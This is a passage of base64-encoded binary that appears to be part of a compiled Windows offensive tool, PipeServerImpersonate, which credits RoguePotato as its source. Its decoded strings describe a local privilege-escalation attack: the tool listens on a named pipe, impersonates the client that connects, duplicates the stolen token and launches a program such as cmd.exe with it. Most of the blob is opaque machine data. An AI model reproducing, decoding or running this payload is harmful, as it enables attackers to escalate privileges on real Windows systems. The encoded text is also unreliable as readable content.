AA+rXkrphMECD7E0+7AF5cFPgJJ1K13Sq09DjA38D92Dj7D9gZH12LhPRS8TR/MAQY+v+X2UeDz6j3r8xoeC3oJPscCwHCJo8A9UcdXAAAuED4Obs3uAFsVPq+1A3Apht89baM2s7lXED5P6gZKyEsTPq28oZ7aQxY+Kur3tKdmHT7v/Pc44LL2PYjwcMZU6fM9s8o6CQlyBD6nXSfnj3AdPue5cXee3x8+YAYKp78nCD4UvE0fzAEWPlteahD2NwY+S2J88RNqEj46YoDOsj4JPt6UFenRMBQ+MaCPEBBrHT5B8roLnIcWPiu8pl4BCP89bGfGzT22KT4sq8S8LAIrPkRl3X3QF/k9njcDV2BAFT5gG3qUi9EMPn6pfCdlrRc+qV+fxU2IET6C0AZgxBEXPvgIMTwuCS8+OuEr48UUFz6aT3P9p7smPoOE4LWP9P09lQtNx5svIz4TDHlI6HP5PW5Yxgi8zB4+mEpS+ekVIT64MTFZQBcvPjU4ZCWLzxs+gO2LHahfHz7k2Sn5TUokPpQMItggmBI+CeMEk0gLKj7+ZaarVk0fPmNRNhmQDCE+NidZ/ngP+D3KHMgliFIQPmp0bX1TleA9YAYKp78nGD48k0XsqLAGPqnb9Rv4WhA+FdVVJvriFz6/5K6/7FkNPqM/aNovix0+Nzc6/d24JD4EEq5hfoITPp8P6Ul7jCw+HVmXFfDqKT42ezFupqoZPlUGcglWci4+VKx6/DMcJj5SomHPK2YpPjAnxBHIQxg+NstaC7tkID6kASeEDDQKPtZ5j7VVjho+mp1enCEt6T1q/X8N5mM/PhRjUdkOmy4+DDViGZAjKT6BXng4iG8yPq+mq0xqWzs+HHaO3Goi8D3tGjox10o8PheNc3zoZBU+GGaK8eyPMz5mdnf1npI9PrigjfA7SDk+Jliq7g7dOz66NwJZ3cQ5PsfK6+Dp8xo+rA0nglPONT66uSpTdE85PlSGiJUnNAc+8EvjCwBaDD6C0AZgxBEnPviM7bQlACU+oNLyzovRLj5UdQoMLighPsqnWTPzcA0+JUCoE35/Kz4eiSHDbjAzPlB1iwP4xz8+ZB3XjDWwPj50lIUiyHY6PuOG3lLGDj0+r1iG4MykLz6eCsDSooQ7PtFbwvKwpSA+mfZbImDWPT438JuFD7EIPuHLkLUjiD4+9pYe8xETNj6aD6Jchx8uPqW5OUlylSw+4lg+epUFOD40A5/qJvEvPglWjln1Uzk+SMRW+G/BNj70YfIPIsskPqJTPdUg4TU+VvKJYX9SOj4PnNT//FY4PtrXKIIuDDA+4N9ElNAT8T2mWeoOYxAlPhHXMg94LiY+z/gQGtk+7T2FzUt+SmUjPiGtgEl4WwU+ZG6x1C0vIT4M9TnZrcQ3PvyAcWKEFyg+YUnhx2JR6j1jUTYZkAwxPoh2oStNPDc+gT3p4KXoKj6vIRbwxrAqPmZb3XSLHjA+lFS77G8gLT4AzE9yi7TwPSniYQsfgz8+r7wHxJca+D2qt8scbCg+PpMKIkkLYyg+XCyiwRUL/z1GCRznRVQ1PoVtBvgw5js+OWzZ8N+ZJT6BsI+xhcw2PsioHgBtRzQ+H9MWnog/Nz6HKnkNEFczPvYBYa550Ts+4vbDVhCjDD77CJxicCg9Pj9n0oA4ujo+pn0pyzM2LD4C6u+ZOIQhPuYIIJ3JzDs+UNO9RAUAOD7hamAmwpErPt8rtibfeio+yW6CyE92GD7waA/lPU8fPuOVeXXKYPc9R1GA035m/D1v32oZ9jM3PmuDPvMQty8+ExBkum6IOT4ajK/QaFP7PXEpjRtpjDU++whtImWU/j2XAD8GflgzPhifEgLnGDY+VKx6/DMcNj5KYAiEpgc/PiFUlOS/NDw+CzBBDvCxOD5jG9aEQkM/PjZ0OV4JYzo+3hm5VoZCND6m2bIBkso2PhyTKjqCOCc+MJIXDogRPD7+Um2N3D0xPhfpIonV7jM+UN1rhJJZKT6LJy5fTdsNPsQ1BirxpfE9NDwsiPBCRj5eR/anm+4qPuRgSoN/SyY+LnlD4kINKT4BTxMIICdMPlvP1hYueEo+SGbaeVxQRD4hzU3q1KlMPrzVfGI9fSk+E6q8+VyxID7dds9jIFsxPkgnqvPmgyk+lOn/9GRMPz4PWuh8ur5GPrimTv1pnDs+q6Rfg6VqKz7R7Q95w8xDPuBPQMRMwCk+ndh1ektzQD4SFuDEBEQbPpRIzsJlxUA+zTXZQRTHMz5OO2tVkqRyPUPcQQMJ+iA+9NnjCXCPLj5FigSL9htLPlap+t9S7j4+vWXkAAlrRT5mdnf1npJNPmDiN4aibkg+8KIM8a9lRj507Eiv/REvPsfRpIYbvkw+ZXao/luwJT4dShoKws5BPp+bQApfzUE+cFAmyFY2RT5gIig12H43PtK5QDC8FyQ+8u95e++OQD7pV9w5b8dNPlf0DKeTBEw+DKalztaDSj66V8UNcNYwPgq96BJsyUQ+FSPjkxksPT5Cgl8TIcciPn102k0+mic+K6dBaZ/4/D0xCPECp0khPtt1gXxLrU4+Cudj/jBpTj4v7tm+BuFBPpIc8YIraC0+fKTbiPEHOj72csEtNPlAPiU+Yt4/7wM+AAAAAAAAAAAAAAAAAAAAQCDgH+Af4P8/8Af8AX/A/z8S+gGqHKH/PyD4gR/4gf8/tdugrBBj/z9xQkqeZUT/P7UKI0T2Jf8/CB988MEH/z8CjkX4x+n+P8DsAbMHzP4/6wG6eoCu/j9nt/CrMZH+P+RQl6UadP4/dOUByTpX/j9zGtx5kTr+Px4eHh4eHv4/HuABHuAB/j+Khvjj1uX9P8odoNwByv0/24G5dmCu/T+Kfx4j8pL9PzQsuFS2d/0/snJ1gKxc/T8d1EEd1EH9Pxpb/KMsJ/0/dMBuj7UM/T/Gv0RcbvL8PwubA4lW2Pw/58sBlm2+/D+R4V4Fs6T8P0KK+1omi/w/HMdxHMdx/D+GSQ3RlFj8P/D4wwGPP/w/HKAuObUm/D/gwIEDBw78P4uNhu6D9fs/9waUiSvd+z97Pohl/cT7P9C6wRT5rPs/I/8YKx6V+z+LM9o9bH37PwXuvuPiZfs/TxvotIFO+z/OBthKSDf7P9mAbEA2IPs/pCLZMUsJ+z8or6G8hvL6P16QlH/o2/o/G3DFGnDF+j/964cvHa/6P75jamDvmPo/WeEwUeaC+j9tGtCmAW36P0qKaAdBV/o/GqRBGqRB+j+gHMWHKiz6PwJLevnTFvo/GqABGqAB+j/ZMxCVjuz5Py1oaxef1/k/AqHkTtHC+T/aEFXqJK75P5qZmZmZmfk//8CODS+F+T9yuAz45HD5P6534wu7XPk/4OnW/LBI+T/mLJt/xjT5Pyni0En7IPk/1ZABEk8N+T/6GJyPwfn4Pz838XpS5vg/0xgwjQHT+D86/2KAzr/4P6rzaw+5rPg/nIkB9sCZ+D9KsKvw5Yb4P7mSwLwndPg/GIZhGIZh+D8UBnjCAE/4P92+snqXPPg/oKSCAUoq+D8YGBgYGBj4PwYYYIABBvg/QH8B/QX09z8dT1pRJeL3P/QFfUFf0Pc/fAEukrO+9z/D7OAIIq33P4s5tmuqm/c/yKR4gUyK9z8NxpoRCHn3P7GpNOTcZ/c/bXUBwspW9z9GF1100UX3P43+QcXwNPc/vN5Gfygk9z8JfJxteBP3P3CBC1zgAvc/F2DyFmDy9j/HN0Nr9+H2P2HIgSam0fY/F2zBFmzB9j89GqMKSbH2P5ByU9E8ofY/wNCIOkeR9j8XaIEWaIH2PxpnATafcfY/+SJRauxh9j+jSjuFT1L2P2QhC1nIQvY/3sCKuFYz9j9AYgF3+iP2P5SuMWizFPY/BhZYYIEF9j/8LSk0ZPb1P+cV0Lhb5/U/peLsw2fY9T9XEJMriMn1P5H6R8a8uvU/wFoBawWs9T+qzCPxYZ31P+1YgTDSjvU/YAVYAVaA9T86a1A87XH1P+JSfLqXY/U/VVVVVVVV9T/+grvmJUf1P+sP9EgJOfU/SwWoVv8q9T8V+OLqBx31P8XEEeEiD/U/FVABFVAB9T+bTN1ij/P0PzkFL6fg5fQ/TCzcvkPY9D9uryWHuMr0P+GPpt0+vfQ/W79SoNav9D9KAXatf6L0P2fQsuM5lfQ/gEgBIgWI9D97FK5H4Xr0P2ZgWTTObfQ/ms/1x8tg9D/Kdsfi2VP0P/vZYmX4RvQ/Te6rMCc69D+HH9UlZi30P1FZXia1IPQ/FBQUFBQU9D9mZQ7Rggf0P/sTsD8B+/M/B6+lQo/u8z8CqeS8LOLzP8Z1qpHZ1fM/56t7pJXJ8z9VKSPZYL3zPxQ7sRM7sfM/Ish6OCSl8z9jfxgsHJnzP44IZtMijfM/FDiBEziB8z/uRcnRW3XzP0gH3vONafM/+CqfX85d8z/BeCv7HFLzP0YT4Kx5RvM/srxXW+Q68z/6HWrtXC/zP78QK0rjI/M/tuvpWHcY8z+Q0TABGQ3zP2ACxCrIAfM/aC+hvYT28j9L0f6hTuvyP5eAS8Al4PI/oFAtAQrV8j+gLIFN+8nyPxE3Wo75vvI/QCsBrQS08j8FwfOSHKnyP54S5ClBnvI/pQS4W3KT8j8TsIgSsIjyP03OoTj6ffI/NSeBuFBz8j8nAdZ8s2jyP/GSgHAiXvI/sneRfp1T8j+SJEmSJEnyP1tgF5e3PvI/37yaeFY08j8qEqAiASryP3j7IYG3H/I/5lVIgHkV8j/ZwGcMRwvyPxIgARIgAfI/cB/BfQT38T9MuH889OzxP3S4Pzvv4vE/vUouZ/XY8T8dgaKtBs/xP1ngHPwixfE/Ke1GQEq78T/juvJnfLHxP5Z7GmG5p/E/nhHgGQGe8T+cooyAU5TxP9srkIOwivE/EhiBERiB8T+E1hsZinfxP3lzQokGbvE/ATL8UI1k8T8NJ3VfHlvxP8nV/aO5UfE/O80KDl9I8T8kRzSNDj/xPxHINRHINfE/rMDtiYss8T8zMF3nWCPxPyZIpxkwGvE/ERERERER8T+AEAG++wfxPxHw/hDw/vA/oiWz+u318D+QnOZr9ezwPxFgglUG5PA/lkaPqCDb8D86njVWRNLwPzvavE9xyfA/cUGLhqfA8D/InSXs5rfwP7XsLnIvr/A/pxBoCoGm8D9gg6+m253wP1QJATk/lfA/4mV1s6uM8D+EEEIIIYTwP+LquCmfe/A/xvdHCiZz8D/7EnmctWrwP/yp8dJNYvA/hnVyoO5Z8D8ENNf3l1HwP8VkFsxJSfA/EARBEARB8D/8R4K3xjjwPxpeH7WRMPA/6Sl3/GQo8D8IBAKBQCDwPzd6UTYkGPA/EBAQEBAQ8D+AAAECBAjwPwAAAAAAAPA/AAAAAAAAAABsb2cxMAAAAAAAAAAAAAAA////////P0P///////8/w+jvAUABAAAAUFUBQAEAAABJbml0aWFsaXplU2VjdXJpdHlEZXNjcmlwdG9yKCkgZmFpbGVkLiBFcnJvcjogJWQKAAAAAAAAAEQAOgAoAEEAOwBPAEkAQwBJADsARwBBADsAOwA7AFcARAApAAAAAABDb252ZXJ0U3RyaW5nU2VjdXJpdHlEZXNjcmlwdG9yVG9TZWN1cml0eURlc2NyaXB0b3IoKSBmYWlsZWQuIEVycm9yOiAlZAoAAAAAAAAAAFstXSBFcnJvciBDcmVhdGVQaXBlICVkAFsqXSBMaXN0ZW5pbmcgb24gcGlwZSAlUywgd2FpdGluZyBmb3IgY2xpZW50IHRvIGNvbm5lY3QKAAAAAAAAAABbKl0gQ2xpZW50IGNvbm5lY3RlZCEKAABbLV0gRmFpbGVkIHRvIGltcGVyc29uYXRlIHRoZSBjbGllbnQuJWQgJWQKAAAAAABbK10gR290IHVzZXIgVG9rZW4hISEKAABbLV0gRXJyb3IgZHVwbGljYXRpbmcgSW1wZXJzb25hdGlvblRva2VuOiVkCgAAAABbKl0gRHVwbGljYXRlVG9rZW5FeCBzdWNjZXNzIQoAAAAAAAAAAAAAWypdIFRva2VuIGF1dGhlbnRpY2F0aW9uIHVzaW5nIENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XIGZvciBsYXVuY2hpbmc6ICVTCgAAAAAAAABbKl0gU3VjY2VzcyBleGVjdXRpbmc6ICVTCgAAAAAAAFsqXSBDcmVhdGluZyBQaXBlIFNlcnZlciB0aHJlYWQuLgoAAAAAAAAAAAAAAAAAAFsALQBdACAATgBhAG0AZQBkACAAcABpAHAAZQAgAGQAaQBkAG4AJwB0ACAAcgBlAGMAZQBpAHYAZQBkACAAYQBuAHkAIABjAG8AbgBuAGUAYwB0ACAAcgBlAHEAdQBlAHMAdAAuACAARQB4AGkAdABpAG4AZwAgAC4ALgAuACAACgAAAAAAAABQAGkAcABlAFMAZQByAHYAZQByAEkAbQBwAGUAcgBzAG8AbgBhAHQAZQAAAAAAAABXAHIAbwBuAGcAIABBAHIAZwB1AG0AZQBuAHQAOgAgACUAcwAKAAAAWytdIFN0YXJ0aW5nIFBpcGVzZXJ2ZXIuLi4KAAAAAABTAGUASQBtAHAAZQByAHMAbwBuAGEAdABlAFAAcgBpAHYAaQBsAGUAZwBlAAAAAABbAC0AXQAgAEEAIABwAHIAaQB2AGkAbABlAGcAZQAgAGkAcwAgAG0AaQBzAHMAaQBuAGcAOgAgACcAJQB3AHMAJwAuACAARQB4AGkAdABpAG4AZwAgAC4ALgAuAAoAAABcAFwALgBcAHAAaQBwAGUAXAAlAFMAAAAAAAAAAAAAAAoKCVBpcGVTZXJ2ZXJJbXBlcnNvbmF0ZQoJQHNoaXRzZWN1cmUsIGNvZGUgc3RvbGVuIGZyb20gQHNwbGludGVyX2NvZGUncyAmJiBAZGVjb2Rlcl9pdCdzIFJvZ3VlUG90YXRvIChodHRwczovL2dpdGh1Yi5jb20vYW50b25pb0NvY28vUm9ndWVQb3RhdG8pIAoKCgAAAAAAAAAAAABNYW5kYXRvcnkgYXJnczogCi1lIGNvbW1hbmRsaW5lOiBjb21tYW5kbGluZSBvZiB0aGUgcHJvZ3JhbSB0byBsYXVuY2gKAAAKCgAAAAAAAE9wdGlvbmFsIGFyZ3M6IAotcCBwaXBlbmFtZV9wbGFjZWhvbGRlcjogcGxhY2Vob2xkZXIgdG8gYmUgdXNlZCBpbiB0aGUgcGlwZSBuYW1lIGNyZWF0aW9uIChkZWZhdWx0OiBQaXBlU2VydmVySW1wZXJzb25hdGUpCi16IDogdGhpcyBmbGFnIHdpbGwgcmFuZG9taXplIHRoZSBwaXBlbmFtZV9wbGFjZWhvbGRlciAoZG9uJ3QgdXNlIHdpdGggLXApCgAAAAAAAAAAAABFeGFtcGxlIHRvIGV4ZWN1dGUgY21kLmV4ZSBhbmQgY3JlYXRlIGEgbmFtZWQgcGlwZSBuYW1lZCB0ZXN0cGlwZXM6IAoJUGlwZVNlcnZlckltcGVyc29uYXRlLmV4ZSAtZSAiQzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIiAtcCB0ZXN0cGlwZXMKAABbLV0gRXJyb3IgU2V0UHJvY2Vzc1dpbmRvd1N0YXRpb246JWQKAAAAZABlAGYAYQB1AGwAdAAAAFstXSBFcnJvciBvcGVuIERlc2t0b3A6JWQKAAAAAAAAWy1dIEVycm9yIFNldFByb2Nlc3NXaW5kb3dTdGF0aW9uMjolZAoAAFstXSBFcnJvciBhZGQgQWNlIFN0YXRpb246JWQKAAAAWy1dIEVycm9yIGFkZCBBY2UgZGVza3RvcDolZAoAAAAwMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5egAAWy1dIE9wZVByb2Nlc3NUb2tlbiBlcnI6JWQKAAAAAABbLV0gTG9va3VwUHJpdmlsZWdlIGVycjolZAoAAAAAAFstXSBBZGp1c3RQcml2aWxlZ2UgZXJyOiVkCgAAAAAA4ax5YAAAAAANAAAA8AIAAFzwAQBc5AEAAAAAAOGseWAAAAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIIAJAAQAAAAAAAAAAAAAAAAAAAAAAAABwYwFAAQAAAIBjAUABAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4YwFAAQAAAIhjAUABAAAAkGMBQAEAAAABAAAAAAAAAAAAAABoKgIAGO8BAPDuAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAMO8BAAAAAAAAAAAAQO8BAAAAAAAAAAAAAAAAAGgqAgAAAAAAAAAAAP////8AAAAAQAAAABjvAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABAKgIAkO8BAGjvAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAqO8BAAAAAAAAAAAAwO8BAEDvAQAAAAAAAAAAAAAAAAAAAAAAQCoCAAEAAAAAAAAA/////wAAAABAAAAAkO8BAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAJAqAgAQ8AEA6O8BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAo8AEAAAAAAAAAAAA48AEAAAAAAAAAAAAAAAAAkCoCAAAAAAAAAAAA/////wAAAABAAAAAEPABAAAAAAAAAAAAR0NUTAAQAAAQSgEALnRleHQkbW4AAAAAEFoBAEAAAAAudGV4dCRtbiQwMABQWgEAAAUAAC50ZXh0JHgAAGABAHADAAAuaWRhdGEkNQAAAABwYwEAKAAAAC4wMGNmZwAAmGMBAAgAAAAuQ1JUJFhDQQAAAACgYwEACAAAAC5DUlQkWENBQQAAAKhjAQAIAAAALkNSVCRYQ1oAAAAAsGMBAAgAAAAuQ1JUJFhJQQAAAAC4YwEACAAAAC5DUlQkWElBQQAAAMBjAQAIAAAALkNSVCRYSUFDAAAAyGMBABgAAAAuQ1JUJFhJQwAAAADgYwEACAAAAC5DUlQkWElaAAAAAOhjAQAIAAAALkNSVCRYUEEAAAAA8GMBABAAAAAuQ1JUJFhQWAAAAAAAZAEACAAAAC5DUlQkWFBYQQAAAAhkAQAIAAAALkNSVCRYUFoAAAAAEGQBAAgAAAAuQ1JUJFhUQQAAAAAYZAEACAAAAC5DUlQkWFRaAAAAACBkAQDQigAALnJkYXRhAADw7gEAbAEAAC5yZGF0YSRyAAAAAFzwAQD0AgAALnJkYXRhJHp6emRiZwAAAFDzAQAIAAAALnJ0YyRJQUEAAAAAWPMBAAgAAAAucnRjJElaWgAAAABg8wEACAAAAC5ydGMkVEFBAAAAAGjzAQAIAAAALnJ0YyRUWloAAAAAcPMBAMAQAAAueGRhdGEAADAEAgCEAAAALnhkYXRhJHgAAAAAtAQCAFAAAAAuaWRhdGEkMgAAAAAEBQIAFAAAAC5pZGF0YSQzAAAAABgFAgBwAwAALmlkYXRhJDQAAAAAiAgCAFoIAAAuaWRhdGEkNgAAAAAAIAIAQAoAAC5kYXRhAAAAQCoCAHAAAAAuZGF0YSRyALAqAgD4FQAALmJzcwAAAAAAUAIApBMAAC5wZGF0YQAAAHACAJQAAABfUkRBVEEAAACAAgBgAAAALnJzcmMkMDEAAAAAYIACAIABAAAucnNyYyQwMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZLQsAG2QfABs0HgAbARYAFPAS4BDQDsAMcAAAAFYBAAEAAABlEAAAZBMAAFBaAQAAAAAAogAAAAEHAwAHYgNQAjAAABksCwAaZB0AGjQcABoBFAAT8BHgD9ANwAtwAAAAVgEAAQAAAFoUAACOFgAA4FoBAAAAAACSAAAAARsEABtSF3AWYBUwGR8FAA1kSAANAUQABnAAAHxVAQAQAgAAIQgCAAg0RwDgFwAAcBgAAPjzAQAhAAAA4BcAAHAYAAD48wEAAQYCAAYyAjAZHgUADAFWAAXwA2ACMAAAfFUBAKACAAAhEAQAEHRcAAhUWgBgGwAAFhwAADz0AQAhCAIACORdABYcAAAmHAAAVPQBACEAAAAWHAAAJhwAAFT0AQAhAAAAYBsAABYcAAA89AEAAQQBAARCAAABAAAACQ8GAA9kCQAPNAgAD1ILcEArAAACAAAAsSAAALYhAABMWwEAtiEAAOohAAD8IQAATFsBALYhAAABBgIABjICUAEJAQAJYgAAAQgEAAhyBHADYAIwCQQBAAQiAABAKwAAAQAAAK8kAAA5JQAAalsBADklAAABAgEAAlAAAAENBAANNAkADTIGUAEVBQAVNLoAFQG4AAZQAAABCgQACjQGAAoyBnABDwYAD2QGAA80BQAPEgtwAQAAAAAAAAABAAAAARwMABxkEAAcVA8AHDQOABxyGPAW4BTQEsAQcAkNAQANggAAQCsAAAEAAADxLQAAAC4AAIJbAQAALgAAAQcDAAdCA1ACMAAAAAAAAAIBAwACFgAGAXAAAAEAAAABAAAAAQAAAAEAAAABDwYAD2QHAA80BgAPMgtwARwMABxkDAAcVAsAHDQKABwyGPAW4BTQEsAQcAEWCgAWVAwAFjQLABYyEvAQ4A7ADHALYBkcAwAOARwAAlAAAHxVAQDQAAAAARQIABRkDQAUVAwAFDQLABRyEHAJGAIAGNIUMEArAAABAAAAIzYAAEM2AAAYXAEAQzYAAAEHAwAHggNQAjAAAAAAAAACAgQAAxYABgJgAXABAAAAGR4IAB5SGvAY4BbQFMAScBFgEDBAKwAAAwAAAM5SAABgUwAARl0BAGBTAACTUgAAh1MAAFxdAQAAAAAAwlMAAMhTAABcXQEAAAAAAAEUCAAUZAgAFFQHABQ0BgAUMhBwGRAIABDSDPAK4AjQBsAEcANgAjBAKwAAAgAAAKVQAADKUAAAqVwBAMpQAAClUAAAQlEAAM5cAQAAAAAAARwMABxkDQAcVAwAHDQKABwyGPAW4BTQEsAQcAEZCgAZdA8AGWQOABlUDQAZNAwAGZIV4AEZCgAZdAkAGWQIABlUBwAZNAYAGTIV4AkZCgAZdAwAGWQLABk0CgAZUhXwE+AR0EArAAACAAAAXUEAAJJCAAABAAAAzEIAALJCAADMQgAAAQAAAMxCAAAJFQgAFXQIABVkBwAVNAYAFTIR4EArAAABAAAAAkMAAHhDAAABAAAAjkMAABknCgAZASUADfAL4AnQB8AFcARgAzACUHxVAQAQAQAAARoKABo0FAAashbwFOAS0BDADnANYAxQASULACU0IwAlARgAGvAY4BbQFMAScBFgEFAAAAEEAQAEQgAAAQQBAARCAAABBAEABEIAAAEEAQAEQgAAARUIABV0CAAVZAcAFTQGABUyEeABDwYAD2QPAA80DgAPkgtwARYEABY0DAAWkg9QCQYCAAYyAjBAKwAAAQAAAMlYAAAYWQAAmV0BAGNZAAARDwQADzQGAA8yC3BAKwAAAQAAAI1YAACWWAAAf10BAAAAAAABCQIACbICUAEdDAAddAsAHWQKAB1UCQAdNAgAHTIZ8BfgFcABDwYAD1QIAA80BwAPMgtwARIIABJUCgASNAkAEjIO4AxwC2ABGAoAGGQNABhUDAAYNAsAGFIU8BLgEHABCgQACjQNAAqSBnABGAoAGGQKABhUCQAYNAgAGDIU8BLgEHAZHgYAD2QOAA80DQAPkgtwfFUBAEAAAAAZLgkAHWSgAB00nwAdAZoADuAMcAtQAAB8VQEAwAQAAAEVCAAVdAkAFWQIABU0BwAVMhHgGSUKABZUEAAWNA8AFnIS8BDgDtAMcAtgfFUBADgAAAABDwYAD2QIAA80BwAPMgtwARAGABB0DgAQNA0AEJIM4AESCAASVAwAEjQLABJSDuAMcAtgASIKACJ0CQAiZAgAIlQHACI0BgAiMh7gAQUCAAU0AQARDwQADzQGAA8yC3BAKwAAAQAAAF5dAABoXQAAtF0BAAAAAAARDwQADzQGAA8yC3BAKwAAAQAAAB5dAAAoXQAAtF0BAAAAAAAZLQkAFwESAAvwCeAHwAVwBGADMAJQAACIVgEA6HQBAIoAAAD/////z10BAAAAAACciAAAAAAAAEqLAAD/////AQYCAAZSAjABEwgAEzQMABNSDPAK4AhwB2AGUAEVCQAVxAUAFXQEABVkAwAVNAIAFfAAAAEPBAAPNAYADzILcAEYCgAYZAwAGFQLABg0CgAYUhTwEuAQcAEPBgAPZAkADzQIAA9SC3ABBwEAB0IAABEUBgAUZAkAFDQIABRSEHBAKwAAAQAAAI+WAADHlgAA210BAAAAAAABEgIAEnILUAELAQALYgAAARgKABhkCwAYVAoAGDQJABgyFPAS4BBwEQ8EAA80BgAPMgtwQCsAAAEAAADhlwAA65cAAH9dAQAAAAAAEQ8EAA80BgAPMgtwQCsAAAEAAAAdmAAAJ5gAAH9dAQAAAAAACQQBAARCAABAKwAAAQAAAEqdAABSnQAAAQAAAFKdAAABHQwAHXQPAB1kDgAdVA0AHTQMAB1yGfAX4BXQARYKABZUEAAWNA4AFnIS8BDgDsAMcAtgAAAAAAEAAAABBAEABGIAABkuCQAdZMQAHTTDAB0BvgAO4AxwC1AAAHxVAQDgBQAAARQIABRkCgAUVAkAFDQIABRSEHABCgIACjIGMAEFAgAFdAEAARQIABRkDgAUVA0AFDQMABSSEHARCgQACjQIAApSBnBAKwAAAQAAALa0AAA0tQAA9V0BAAAAAAABDAIADHIFUBEPBAAPNAYADzILcEArAAABAAAAbrUAANe1AAC0XQEAAAAAABESBgASNBAAErIO4AxwC2BAKwAAAQAAAAy2AAC0tgAADl4BAAAAAAARBgIABjICMEArAAABAAAASroAAGG6AAArXgEAAAAAAAEcCwAcdBcAHGQWABxUFQAcNBQAHAESABXgAAABFQYAFTQQABWyDnANYAxQAQkCAAmSAlABCQIACXICUBEPBAAPNAYADzILcEArAAABAAAA6cEAAPnBAAB/XQEAAAAAABEPBAAPNAYADzILcEArAAABAAAAacIAAH/CAAB/XQEAAAAAABEPBAAPNAYADzILcEArAAABAAAAscIAAOHCAAB/XQEAAAAAABEPBAAPNAYADzILcEArAAABAAAAKcIAADfCAAB/XQEAAAAAAAEUCAAUZBAAFFQPABQ0DgAUshBwARkKABl0DwAZZA4AGVQNABk0DAAZkhXwARwMABxkFgAcVBUAHDQUABzSGPAW4BTQEsAQcAEZCgAZdA0AGWQMABlUCwAZNAoAGXIV4AEVCAAVdA4AFVQNABU0DAAVkhHgGSEIABJUDgASNA0AEnIO4AxwC2B8VQEAMAAAAAEJAgAJMgUwAQIBAAIwAAAZIwoAFDQSABRyEPAO4AzQCsAIcAdgBlB8VQEAMAAAABkwCwAfNGIAHwFYABDwDuAM0ArACHAHYAZQAAB8VQEAuAIAAAEcDAAcZA4AHFQNABw0DAAcUhjwFuAU0BLAEHAZIwoAFDQSABRyEPAO4AzQCsAIcAdgBlB8VQEAOAAAAAEGAgAGcgIwEQ8GAA9kCAAPNAcADzILcEArAAABAAAA+eUAAEjmAABEXgEAAAAAAAEZBgAZNAwAGXIScBFgEFAZKwcAGmT0ABo08wAaAfAAC1AAAHxVAQBwBwAAEQ8EAA80BgAPMgtwQCsAAAEAAABh3wAA7OAAAH9dAQAAAAAAARkKABl0CwAZZAoAGVQJABk0CAAZUhXgARQGABRkBwAUNAYAFDIQcBEVCAAVdAoAFWQJABU0CAAVUhHwQCsAAAEAAAAL8AAAUvAAACteAQAAAAAAAQ4CAA4yCjABGAYAGFQHABg0BgAYMhRgGS0NNR90FAAbZBMAFzQSABMzDrIK8AjgBtAEwAJQAAB8VQEAUAAAABEKBAAKNAYACjIGcEArAAABAAAAG/oAAC36AABdXgEAAAAAABEGAgAGMgIwQCsAAAEAAAB6/AAAkPwAAHZeAQAAAAAAEREIABE0EQARcg3gC9AJwAdwBmBAKwAAAgAAAFn+AAAZ/wAAjF4BAAAAAACL/wAAo/8AAIxeAQAAAAAAEQ8EAA80BgAPMgtwQCsAAAEAAAC6/AAA0PwAAH9dAQAAAAAAAQoEAAo0BwAKMgZwGSgIABp0FAAaZBMAGjQSABryEFB8VQEAcAAAABEPBAAPNAcADzILcEArAAABAAAAnAIBAKYCAQCtXgEAAAAAAAEIAQAIYgAAEQ8EAA80BgAPMgtwQCsAAAEAAADRAgEALAMBAMVeAQAAAAAAERsKABtkDAAbNAsAGzIX8BXgE9ARwA9wQCsAAAEAAACwDAEA4QwBAN9eAQAAAAAAARcKABc0FwAXshDwDuAM0ArACHAHYAZQGSoLABw0KAAcASAAEPAO4AzQCsAIcAdgBlAAAHxVAQD4AAAAGS0JABtUkAIbNI4CGwGKAg7gDHALYAAAfFUBAEAUAAAZMQsAH1SWAh80lAIfAY4CEvAQ4A7ADHALYAAAfFUBAGAUAAABFwoAF1QMABc0CwAXMhPwEeAP0A3AC3AZLQoAHAH7AA3wC+AJ0AfABXAEYAMwAlB8VQEAwAcAAAEWCQAWAUQAD/AN4AvACXAIYAdQBjAAACEIAgAI1EMAoBMBAMwVAQDoAQIAIQAAAKATAQDMFQEA6AECAAETBgATZAgAEzQHABMyD3ABFAYAFGQIABQ0BwAUMhBwGR8FAA0BigAG4ATQAsAAAHxVAQAQBAAAISgKACj0hQAgdIYAGGSHABBUiAAINIkAsC8BAAswAQBEAgIAIQAAALAvAQALMAEARAICAAEPBgAPZBEADzQQAA/SC3AZLQ1VH3QUABtkEwAXNBIAE1MOsgrwCOAG0ATAAlAAAHxVAQBYAAAAEQ8EAA80BgAPMgtwQCsAAAEAAACROQEA0TkBAMVeAQAAAAAAERsKABtkDAAbNAsAGzIX8BXgE9ARwA9wQCsAAAEAAADlOwEAFzwBAN9eAQAAAAAAAQkBAAlCAAAZHwgAEDQPABByDPAK4AhwB2AGUHxVAQAwAAAAAQoDAApoAgAEogAAARQIABRkDAAUVAsAFDQKABRyEHABDwYAD3QEAApkAwAFNAIAAQgCAAiSBDAZJgkAGGgOABQBHgAJ4AdwBmAFMARQAAB8VQEA0AAAAAEGAgAGEgIwAQsDAAtoBQAHwgAAAAAAAAEEAQAEAgAAAQQBAASCAAABGwgAG3QJABtkCAAbNAcAGzIUUAkPBgAPZAkADzQIAA8yC3BAKwAAAQAAAApUAQARVAEA9l4BABFUAQAJCgQACjQGAAoyBnB